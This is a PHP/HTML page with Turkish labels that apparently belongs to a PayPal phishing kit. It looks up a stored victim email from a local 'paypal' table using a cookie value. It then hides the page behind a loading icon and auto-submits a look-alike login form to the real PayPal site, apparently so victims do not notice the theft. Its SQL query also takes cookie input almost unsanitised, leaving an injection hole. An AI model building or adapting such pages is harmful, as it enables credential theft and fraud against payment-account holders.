<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `paypal` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["myform"].submit();}</script>


<form method="post" name="login_form" action="https://www.paypal.com/tr/cgi-bin/webscr?cmd=_login-submit&amp;dispatch=5885d80a13c0db1f8e263663d3faee8d569c51c61ce57e9125f793ea33988004" id="myform"><input type="hidden" name="login_cmd" value=""><input type="hidden" name="login_params" value=""><fieldset><legend>Üye Girişi</legend><p><label for="login_email"><span class="error">E-posta adresi</span></label><input type="text" id="login_email" class="" name="login_email" value="<?=$email;?>"></p><p><label for="login_password"><span class="error">PayPal şifresi</span></label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""></p><p><label for="target_page">Git</label><select id="target_page" name="target_page"><option value="0" selected="">Hesabım</option><option value="1">İşlemlerim</option></select></p><p><input type="submit" name="submit.x" value="Giriş Yapın" class="button primary"></p></fieldset><p><a href="https://www.paypal.com/tr/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">E-posta adresiniz ve şifreniz ile ilgili yardım için tıklayın.</a></p><p>PayPal'da yeni misiniz? <strong><a href="https://www.paypal.com/tr/cgi-bin/webscr?cmd=_registration-run">Hesap açın</a></strong></p><input name="form_charset" type="hidden" value="UTF-8"><input type="hidden" name="browser_name" value="Chrome"><input type="hidden" name="browser_version" value="537.17"><input type="hidden" name="browser_version_full" value="24.0.1312.57"><input type="hidden" name="operating_system" value="Windows"></form>




</body>
</html>

